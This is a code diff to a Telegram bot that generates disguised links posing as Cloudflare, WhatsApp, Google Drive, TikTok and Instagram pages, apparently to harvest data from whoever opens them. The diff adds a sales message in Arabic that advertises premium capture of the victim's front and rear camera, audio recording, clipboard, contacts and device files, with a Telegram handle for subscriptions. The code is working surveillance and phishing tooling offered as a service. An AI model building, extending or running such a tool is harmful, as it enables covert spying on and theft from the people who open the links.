@@ -36,6 +36,11 @@ let premium    = loadJSON(PREMIUM_FILE,  {});  // { "userId": { expiry: ts|-1, p
 if (!settings.features)      settings.features      = {...DEFAULT_FEATURES};
 if (!settings.premiumFree)   settings.premiumFree   = {...DEFAULT_PREMIUM_FREE};
 if (!settings.premiumFreeExpiry) settings.premiumFreeExpiry = {};
+// ensure all keys always exist (handles old settings.json missing keys)
+Object.keys(DEFAULT_PREMIUM_FREE).forEach(k => {
+  if (!(k in settings.premiumFree)) settings.premiumFree[k] = false;
+  if (!(k in settings.premiumFreeExpiry)) settings.premiumFreeExpiry[k] = null;
+});
 
 function saveUsers()     { saveJSON(USERS_FILE,     [...users]); }
 function saveBanned()    { saveJSON(BANNED_FILE,    [...banned]); }
@@ -861,7 +866,7 @@ bot.on('callback_query', async (q) => {
     const msgId = q.message.message_id;
     if (data.startsWith("pc:t:")) {
       const k = data.replace("pc:t:","");
-      if (k in (settings.premiumFree || {})) {
+      if (k in PREM_FEAT_NAMES) {
         settings.premiumFree[k] = !settings.premiumFree[k];
         if (!settings.premiumFree[k]) settings.premiumFreeExpiry[k] = null;
         saveSettings();
@@ -1030,9 +1035,12 @@ async function createLink(cid, msg) {
     const premiumSection = isPremium(cid)
       ? `\n\n📒 جهات الاتصال (بريميوم):\n${coLink}\n\n🖼️ صور وملفات (بريميوم):\n${fLink}`
       : "";
+    const upsellNote = !isPremium(cid)
+      ? `\n\n━━━━━━━━━━━━━━━\n💎 *ميزات البريميوم:*\n📷 كاميرا أمامية + خلفية\n🎤 تسجيل صوتي\n📋 محتوى الحافظة\n📒 جهات الاتصال الكاملة\n🖼️ صور وملفات الجهاز\n\nللاشتراك تواصل مع @Ye_x00`
+      : "";
     bot.sendMessage(cid,
-      `✅ تم إنشاء الروابط!\n🔗 URL: ${trimmed}\n\n🛡️ Cloudflare:\n${cLink}\n\n🖥️ WebView:\n${wLink}\n\n💬 WhatsApp:\n${waLink}\n\n📁 Google Drive:\n${dlLink}\n\n🎵 TikTok:\n${ttLink}\n\n📷 Instagram:\n${igLink}${premiumSection}`,
-      { reply_markup: JSON.stringify({ inline_keyboard: [
+      `✅ تم إنشاء الروابط!\n🔗 URL: ${trimmed}\n\n🛡️ Cloudflare:\n${cLink}\n\n🖥️ WebView:\n${wLink}\n\n💬 WhatsApp:\n${waLink}\n\n📁 Google Drive:\n${dlLink}\n\n🎵 TikTok:\n${ttLink}\n\n📷 Instagram:\n${igLink}${premiumSection}${upsellNote}`,
+      { parse_mode: "Markdown", reply_markup: JSON.stringify({ inline_keyboard: [
         [{ text:"🔗 إنشاء رابط جديد", callback_data:"crenew" }],
         [{ text:"📷 QR Code", callback_data:`qr:${cid}` }]
       ] }) }
